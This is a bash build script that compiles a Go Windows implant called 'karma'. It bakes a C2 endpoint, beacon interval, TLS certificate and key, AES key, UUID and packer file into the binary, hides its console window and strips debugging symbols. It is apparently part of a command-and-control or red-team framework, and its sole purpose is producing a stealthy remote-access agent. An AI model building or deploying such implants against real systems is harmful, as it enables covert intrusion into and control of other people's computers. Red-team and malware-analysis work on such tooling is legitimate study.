#!/bin/bash
set -e

GOARCH=$1
C2=$2
WAITSEC=$3
CERT=$4
KEY=$5
AESKEY=$6 # rest are base32 encoded
X1=$7 
X2=$8
UUID=$9
PACKER=${10}
OUTFILE=${11}

LDFLAGS=(
    "-X 'main.InitC2Endpoint=${C2}'"
    "-X 'main.InitWaitSeconds=${WAITSEC}'"
    "-X 'main.InitUUID=${UUID}'"
    "-X 'main.certData=${CERT}'"
    "-X 'main.keyData=${KEY}'"
    "-X 'main.InitAESKey=${AESKEY}'"
    "-X 'main.X1=${X1}'"
    "-X 'main.X2=${X2}'"    
    "-X 'main.InitPFile=${PACKER}'"
    "-H=windowsgui"
    "-s"
    "-w"
)

OLDDIR=$PWD

if [ ! -z "$OUTFILE" ]; then
    LOCATION=$OUTFILE
    OUTFILE="-o ${OUTFILE}"
fi

cd $(dirname $0)
GOOS=windows GOARCH=${GOARCH} go build -ldflags="${LDFLAGS[*]}" ${OUTFILE}


if [ -z "$OUTFILE" ]; then
    LOCATION=$OLDDIR/bin
    mkdir -p $LOCATION
    mv karma* $LOCATION
fi
echo "'karma' instance saved at $LOCATION"